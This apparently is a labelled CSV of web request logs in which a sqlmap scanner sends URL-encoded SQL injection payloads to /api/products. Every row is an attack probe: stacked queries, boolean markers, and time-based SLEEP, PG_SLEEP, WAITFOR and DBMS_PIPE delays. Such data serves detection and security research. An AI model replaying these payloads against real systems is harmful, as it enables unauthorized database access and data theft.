@timestamp,auth_token_hash,method,path,path_normalized,remote_ip,request_id,response_size,response_time_ms,sampling_flag,status,upstream,user_agent,user_id_hash,user_role,waf_action,waf_rule_id,label
2026-05-05 02:43:19+00:00,(empty),GET,/api/products?q=a%22%29%3BDECLARE%20%40TpQY%20NVARCHAR%284000%29%3BSET%20%40TpQY%3D%28SELECT%20%27qvvpq%27%2B%28SELECT%20%28CASE%20WHEN%20%289685%3D9685%29%20THEN%20%271%27%20ELSE%20%270%27%20END%29%29%2B%27qzqvq%27%29%3BEXEC%20%40TpQY--,/api/products,172.20.0.10,e3ae09b331f47d82889d28639da29e78,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:19+00:00,(empty),GET,/api/products?q=a%22%3BDECLARE%20%40TpQY%20NVARCHAR%284000%29%3BSET%20%40TpQY%3D%28SELECT%20%27qvvpq%27%2B%28SELECT%20%28CASE%20WHEN%20%289685%3D9685%29%20THEN%20%271%27%20ELSE%20%270%27%20END%29%29%2B%27qzqvq%27%29%3BEXEC%20%40TpQY--,/api/products,172.20.0.10,ff98e029a3c3309b8814bde68fb15d2c,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:19+00:00,(empty),GET,/api/products?q=a%29%3BDECLARE%20%40TpQY%20NVARCHAR%284000%29%3BSET%20%40TpQY%3D%28SELECT%20%27qvvpq%27%2B%28SELECT%20%28CASE%20WHEN%20%289685%3D9685%29%20THEN%20%271%27%20ELSE%20%270%27%20END%29%29%2B%27qzqvq%27%29%3BEXEC%20%40TpQY--,/api/products,172.20.0.10,0cf7a22db8a21b65fb9bf40f72f6539d,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:19+00:00,(empty),GET,/api/products?q=a%29%29%3BDECLARE%20%40TpQY%20NVARCHAR%284000%29%3BSET%20%40TpQY%3D%28SELECT%20%27qvvpq%27%2B%28SELECT%20%28CASE%20WHEN%20%289685%3D9685%29%20THEN%20%271%27%20ELSE%20%270%27%20END%29%29%2B%27qzqvq%27%29%3BEXEC%20%40TpQY--,/api/products,172.20.0.10,b0921221bcab628d1baa0c75bd37822e,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:19+00:00,(empty),GET,/api/products?q=a%3BDECLARE%20%40TpQY%20NVARCHAR%284000%29%3BSET%20%40TpQY%3D%28SELECT%20%27qvvpq%27%2B%28SELECT%20%28CASE%20WHEN%20%289685%3D9685%29%20THEN%20%271%27%20ELSE%20%270%27%20END%29%29%2B%27qzqvq%27%29%3BEXEC%20%40TpQY--,/api/products,172.20.0.10,d2e88d851a282490a43fca7f92b91332,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:19+00:00,(empty),GET,/api/products?q=%28SELECT%20CONCAT%28CONCAT%28%27qvvpq%27%2C%28CASE%20WHEN%20%288248%3D8248%29%20THEN%20%271%27%20ELSE%20%270%27%20END%29%29%2C%27qzqvq%27%29%29,/api/products,172.20.0.10,b712d50ed922034e0a0983a182dff1f6,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:20+00:00,(empty),GET,/api/products?q=%28SELECT%20CONCAT%280x7176767071%2C%28ELT%284829%3D4829%2C1%29%29%2C0x717a717671%29%29,/api/products,172.20.0.10,55c5a3f154bdcbe4908f09423ae82c99,0.0,4.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:20+00:00,(empty),GET,/api/products?q=%28SELECT%20%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%287550%3D7550%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%29,/api/products,172.20.0.10,57c6340aa98966fbb84a8ea322f465bf,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:20+00:00,(empty),GET,/api/products?q=%28SELECT%20CHAR%28113%29%2BCHAR%28118%29%2BCHAR%28118%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28CASE%20WHEN%20%281810%3D1810%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28113%29%29,/api/products,172.20.0.10,2bc2c7d0198ce6687a23a2094470c2cd,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:20+00:00,(empty),GET,/api/products?q=%28SELECT%20CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28CASE%20WHEN%20%287943%3D7943%29%20THEN%20TO_NUMBER%281%29%20ELSE%20TO_NUMBER%280%29%20END%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%20FROM%20DUAL%29,/api/products,172.20.0.10,6bf74c8cb143ae659bf40ccfcd14e10d,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:20+00:00,(empty),GET,/api/products?q=a%27%29%3BSELECT%20SLEEP%285%29%23,/api/products,172.20.0.10,0a392f2007fc4d2d36b3835b7d3fc687,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:20+00:00,(empty),GET,/api/products?q=a%27%29%29%3BSELECT%20SLEEP%285%29%23,/api/products,172.20.0.10,b0190e516f5d5c396fd8f6011a1bb6e1,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:20+00:00,(empty),GET,/api/products?q=a%27%3BSELECT%20SLEEP%285%29%23,/api/products,172.20.0.10,13fe6e987ebc4d59c8d62414e942134d,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:20+00:00,(empty),GET,/api/products?q=a%25%27%3BSELECT%20SLEEP%285%29%23,/api/products,172.20.0.10,120af097ea74089520d0a203147c7c3a,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:20+00:00,(empty),GET,/api/products?q=a%22%29%3BSELECT%20SLEEP%285%29%23,/api/products,172.20.0.10,1cc74deefd16c4e9f770045761679d77,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:20+00:00,(empty),GET,/api/products?q=a%22%3BSELECT%20SLEEP%285%29%23,/api/products,172.20.0.10,840fc8d4344a50fee274cae139a7199c,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:20+00:00,(empty),GET,/api/products?q=a%29%3BSELECT%20SLEEP%285%29%23,/api/products,172.20.0.10,bc720ed209be44dcfb44e0fd836e2f07,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:20+00:00,(empty),GET,/api/products?q=a%29%29%3BSELECT%20SLEEP%285%29%23,/api/products,172.20.0.10,6d80bc16e0f431c704bec2db1beb03cf,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:20+00:00,(empty),GET,/api/products?q=a%3BSELECT%20SLEEP%285%29%23,/api/products,172.20.0.10,cc14992728b7bc4a7c844d9d7fc864c3,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:20+00:00,(empty),GET,/api/products?q=a%27%29%3BSELECT%20PG_SLEEP%285%29--,/api/products,172.20.0.10,341b99a11254aeae14bc709c92c0caae,0.0,4.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:20+00:00,(empty),GET,/api/products?q=a%27%29%29%3BSELECT%20PG_SLEEP%285%29--,/api/products,172.20.0.10,6e6a8587a1344b8fa3f20b7602304f26,0.0,4.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:20+00:00,(empty),GET,/api/products?q=a%27%3BSELECT%20PG_SLEEP%285%29--,/api/products,172.20.0.10,d37c36b7afb6884eb9567a811e366839,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:20+00:00,(empty),GET,/api/products?q=a%25%27%3BSELECT%20PG_SLEEP%285%29--,/api/products,172.20.0.10,3aeb9ad0aab50a63ce66bb814f0b27ae,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:20+00:00,(empty),GET,/api/products?q=a%22%29%3BSELECT%20PG_SLEEP%285%29--,/api/products,172.20.0.10,dc274607ac7097ce9d12fa064a9092db,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:20+00:00,(empty),GET,/api/products?q=a%22%3BSELECT%20PG_SLEEP%285%29--,/api/products,172.20.0.10,4258d5f24c531ffff522c78c36cefb70,0.0,4.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:20+00:00,(empty),GET,/api/products?q=a%29%3BSELECT%20PG_SLEEP%285%29--,/api/products,172.20.0.10,d3d49c91b45417979de5cbc9d79c5a00,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:20+00:00,(empty),GET,/api/products?q=a%29%29%3BSELECT%20PG_SLEEP%285%29--,/api/products,172.20.0.10,6033c974ccfe39e643df9cc380ce4738,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:20+00:00,(empty),GET,/api/products?q=a%3BSELECT%20PG_SLEEP%285%29--,/api/products,172.20.0.10,f5dfe2f563929265273c0a95a1025a2c,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:20+00:00,(empty),GET,/api/products?q=a%27%29%3BSELECT%20COUNT%28%2A%29%20FROM%20GENERATE_SERIES%281%2C5000000%29--,/api/products,172.20.0.10,d83e441bf7625b3c58fe5f40e5d23d53,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:20+00:00,(empty),GET,/api/products?q=a%27%29%29%3BSELECT%20COUNT%28%2A%29%20FROM%20GENERATE_SERIES%281%2C5000000%29--,/api/products,172.20.0.10,9734acf61c0c89019f5c6fc768607884,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:20+00:00,(empty),GET,/api/products?q=a%27%3BSELECT%20COUNT%28%2A%29%20FROM%20GENERATE_SERIES%281%2C5000000%29--,/api/products,172.20.0.10,01cb01b7ad09c6966973eed75aa5d5b0,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:20+00:00,(empty),GET,/api/products?q=a%25%27%3BSELECT%20COUNT%28%2A%29%20FROM%20GENERATE_SERIES%281%2C5000000%29--,/api/products,172.20.0.10,9c3e39ff73de2052861b5205037dac16,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:20+00:00,(empty),GET,/api/products?q=a%22%29%3BSELECT%20COUNT%28%2A%29%20FROM%20GENERATE_SERIES%281%2C5000000%29--,/api/products,172.20.0.10,1a0f60a724eb76438a0c8acbaa8ae9b6,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:20+00:00,(empty),GET,/api/products?q=a%22%3BSELECT%20COUNT%28%2A%29%20FROM%20GENERATE_SERIES%281%2C5000000%29--,/api/products,172.20.0.10,d2761b8bdf91397f5613005a2f02858f,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:20+00:00,(empty),GET,/api/products?q=a%29%3BSELECT%20COUNT%28%2A%29%20FROM%20GENERATE_SERIES%281%2C5000000%29--,/api/products,172.20.0.10,df947320474d5eeb657cababa40f7469,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:20+00:00,(empty),GET,/api/products?q=a%29%29%3BSELECT%20COUNT%28%2A%29%20FROM%20GENERATE_SERIES%281%2C5000000%29--,/api/products,172.20.0.10,9d4f99148bf7931aeb5b708dab89fed1,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:20+00:00,(empty),GET,/api/products?q=a%3BSELECT%20COUNT%28%2A%29%20FROM%20GENERATE_SERIES%281%2C5000000%29--,/api/products,172.20.0.10,810a3d7d3fc5caec74a591353b663ca1,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:20+00:00,(empty),GET,/api/products?q=a%27%29%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--,/api/products,172.20.0.10,537b862f1713b3e74f998891a0344d1a,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:20+00:00,(empty),GET,/api/products?q=a%27%29%29%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--,/api/products,172.20.0.10,43777f92eadf395b3ef4ae07411efe84,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:20+00:00,(empty),GET,/api/products?q=a%27%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--,/api/products,172.20.0.10,c60874dbc5a972d07bc0438b0158550d,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:20+00:00,(empty),GET,/api/products?q=a%25%27%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--,/api/products,172.20.0.10,00066e1643a4a8aba838fc11b3131880,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:20+00:00,(empty),GET,/api/products?q=a%22%29%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--,/api/products,172.20.0.10,4247ee873643cd398e80896f6c95a602,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:20+00:00,(empty),GET,/api/products?q=a%22%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--,/api/products,172.20.0.10,2d4cf15cf6ce4737353cee1a760309cb,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:21+00:00,(empty),GET,/api/products?q=a%29%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--,/api/products,172.20.0.10,e7bce14ba43461141b90d8d91e5f1e94,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:21+00:00,(empty),GET,/api/products?q=a%29%29%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--,/api/products,172.20.0.10,9dc88d3428fa70282ab648c976f71a5e,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:21+00:00,(empty),GET,/api/products?q=a%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--,/api/products,172.20.0.10,e9b77e375d770781c327914da5df8598,0.0,4.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:21+00:00,(empty),GET,/api/products?q=a%27%29%3BDECLARE%20%40x%20CHAR%289%29%3BSET%20%40x%3D0x303a303a35%3BWAITFOR%20DELAY%20%40x--,/api/products,172.20.0.10,ba75872eec3e8b3e9c62b1f62f8c0225,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:21+00:00,(empty),GET,/api/products?q=a%27%29%29%3BDECLARE%20%40x%20CHAR%289%29%3BSET%20%40x%3D0x303a303a35%3BWAITFOR%20DELAY%20%40x--,/api/products,172.20.0.10,23bf004b6195a6e01a692d4bb10f107b,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:21+00:00,(empty),GET,/api/products?q=a%27%3BDECLARE%20%40x%20CHAR%289%29%3BSET%20%40x%3D0x303a303a35%3BWAITFOR%20DELAY%20%40x--,/api/products,172.20.0.10,e5cd4cb79f41ba9d6b48c9ee0882dd31,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:21+00:00,(empty),GET,/api/products?q=a%25%27%3BDECLARE%20%40x%20CHAR%289%29%3BSET%20%40x%3D0x303a303a35%3BWAITFOR%20DELAY%20%40x--,/api/products,172.20.0.10,7cb5b04f8550c7f1f8fde51f20466395,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:21+00:00,(empty),GET,/api/products?q=a%22%29%3BDECLARE%20%40x%20CHAR%289%29%3BSET%20%40x%3D0x303a303a35%3BWAITFOR%20DELAY%20%40x--,/api/products,172.20.0.10,dd64046e2da341ae2a8e953ca2efd061,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:21+00:00,(empty),GET,/api/products?q=a%22%3BDECLARE%20%40x%20CHAR%289%29%3BSET%20%40x%3D0x303a303a35%3BWAITFOR%20DELAY%20%40x--,/api/products,172.20.0.10,3ecb70bf511b807b37d100b21062967a,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:21+00:00,(empty),GET,/api/products?q=a%29%3BDECLARE%20%40x%20CHAR%289%29%3BSET%20%40x%3D0x303a303a35%3BWAITFOR%20DELAY%20%40x--,/api/products,172.20.0.10,f57dbc8700fc977511e79f63689416ad,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:21+00:00,(empty),GET,/api/products?q=a%29%29%3BDECLARE%20%40x%20CHAR%289%29%3BSET%20%40x%3D0x303a303a35%3BWAITFOR%20DELAY%20%40x--,/api/products,172.20.0.10,432da1194ee8f4ae9b40b5374af67f88,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:21+00:00,(empty),GET,/api/products?q=a%3BDECLARE%20%40x%20CHAR%289%29%3BSET%20%40x%3D0x303a303a35%3BWAITFOR%20DELAY%20%40x--,/api/products,172.20.0.10,3db223a0568c1e6b026a9e2febcc8164,0.0,5.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:21+00:00,(empty),GET,/api/products?q=a%27%29%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28103%29%7C%7CCHR%28101%29%7C%7CCHR%2884%29%7C%7CCHR%2889%29%2C5%29%20FROM%20DUAL--,/api/products,172.20.0.10,281064dd8284c4245968c5575f3de65e,0.0,5.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:21+00:00,(empty),GET,/api/products?q=a%27%29%29%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28103%29%7C%7CCHR%28101%29%7C%7CCHR%2884%29%7C%7CCHR%2889%29%2C5%29%20FROM%20DUAL--,/api/products,172.20.0.10,628d0a4718dc61cf39e685c755c90643,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:21+00:00,(empty),GET,/api/products?q=a%27%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28103%29%7C%7CCHR%28101%29%7C%7CCHR%2884%29%7C%7CCHR%2889%29%2C5%29%20FROM%20DUAL--,/api/products,172.20.0.10,c1b2edf6a25cb2ad95ba6504aafc1821,0.0,4.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:21+00:00,(empty),GET,/api/products?q=a%25%27%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28103%29%7C%7CCHR%28101%29%7C%7CCHR%2884%29%7C%7CCHR%2889%29%2C5%29%20FROM%20DUAL--,/api/products,172.20.0.10,4a47c3ccc21c4f7272b6c875df0f8e56,0.0,7.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:21+00:00,(empty),GET,/api/products?q=a%22%29%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28103%29%7C%7CCHR%28101%29%7C%7CCHR%2884%29%7C%7CCHR%2889%29%2C5%29%20FROM%20DUAL--,/api/products,172.20.0.10,9fb36a61220858eade59a0f35b361a9f,0.0,4.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:21+00:00,(empty),GET,/api/products?q=a%22%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28103%29%7C%7CCHR%28101%29%7C%7CCHR%2884%29%7C%7CCHR%2889%29%2C5%29%20FROM%20DUAL--,/api/products,172.20.0.10,7e1d4b5f25b30a8f6adbc5ab2e4b4fc4,0.0,8.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:21+00:00,(empty),GET,/api/products?q=a%29%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28103%29%7C%7CCHR%28101%29%7C%7CCHR%2884%29%7C%7CCHR%2889%29%2C5%29%20FROM%20DUAL--,/api/products,172.20.0.10,04b3e95d25baa02ec704a9c3f8b3f940,0.0,6.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:21+00:00,(empty),GET,/api/products?q=a%29%29%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28103%29%7C%7CCHR%28101%29%7C%7CCHR%2884%29%7C%7CCHR%2889%29%2C5%29%20FROM%20DUAL--,/api/products,172.20.0.10,87017ab0e83f4d81743955d3dc8fc0f3,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:21+00:00,(empty),GET,/api/products?q=a%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28103%29%7C%7CCHR%28101%29%7C%7CCHR%2884%29%7C%7CCHR%2889%29%2C5%29%20FROM%20DUAL--,/api/products,172.20.0.10,b04796d50b12fe8cef0d1aa5a0dc036e,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:21+00:00,(empty),GET,/api/products?q=a%27%29%3BSELECT%20COUNT%28%2A%29%20FROM%20ALL_USERS%20T1%2CALL_USERS%20T2%2CALL_USERS%20T3%2CALL_USERS%20T4%2CALL_USERS%20T5--,/api/products,172.20.0.10,1c60532bb52e311040f13c29a05c7de4,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:21+00:00,(empty),GET,/api/products?q=a%27%29%29%3BSELECT%20COUNT%28%2A%29%20FROM%20ALL_USERS%20T1%2CALL_USERS%20T2%2CALL_USERS%20T3%2CALL_USERS%20T4%2CALL_USERS%20T5--,/api/products,172.20.0.10,5499b4ec0c353b077bc475a726a0e61a,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:21+00:00,(empty),GET,/api/products?q=a%27%3BSELECT%20COUNT%28%2A%29%20FROM%20ALL_USERS%20T1%2CALL_USERS%20T2%2CALL_USERS%20T3%2CALL_USERS%20T4%2CALL_USERS%20T5--,/api/products,172.20.0.10,1c4b744b9b3bfffde7da379b5b82aa1e,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:21+00:00,(empty),GET,/api/products?q=a%25%27%3BSELECT%20COUNT%28%2A%29%20FROM%20ALL_USERS%20T1%2CALL_USERS%20T2%2CALL_USERS%20T3%2CALL_USERS%20T4%2CALL_USERS%20T5--,/api/products,172.20.0.10,0565e3bd4f934e1dda04cb9f64004e8d,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:21+00:00,(empty),GET,/api/products?q=a%22%29%3BSELECT%20COUNT%28%2A%29%20FROM%20ALL_USERS%20T1%2CALL_USERS%20T2%2CALL_USERS%20T3%2CALL_USERS%20T4%2CALL_USERS%20T5--,/api/products,172.20.0.10,f8402b43660ceaf3167d7c4378bac6e8,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
